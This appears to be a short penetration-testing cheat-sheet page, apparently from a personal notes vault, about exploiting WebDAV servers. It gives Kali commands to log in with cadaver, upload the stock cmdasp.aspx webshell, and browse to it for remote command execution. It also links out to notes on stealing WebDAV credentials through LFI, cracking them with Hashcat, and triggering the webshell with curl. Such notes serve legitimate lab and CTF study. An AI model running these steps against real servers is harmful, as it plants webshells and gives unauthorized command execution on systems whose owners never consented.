#### Login
```bash - kali
cadaver http://$TARGET
```
Sometimes you see webdav at different location, be sure to follow your dirsearch.py results!
#### Reverse Shell
```bash - kali
cp /usr/share/webshells/aspx/cmdasp.aspx .
```
Login with steps above if needed.
```bash - kali
put cmdasp.aspx cmdasp.aspx
```
Visit page via browser.
```
http://$TARGET/cmdasp.aspx
```
#### LFI
![[3._LFI RFI#Webdav creds]]
![[Hashcat#WebDav]]
#### File Upload
![[Curl#Upload file]]
#### Webdav trigger webshell
![[Curl#Webdav trigger webshell]]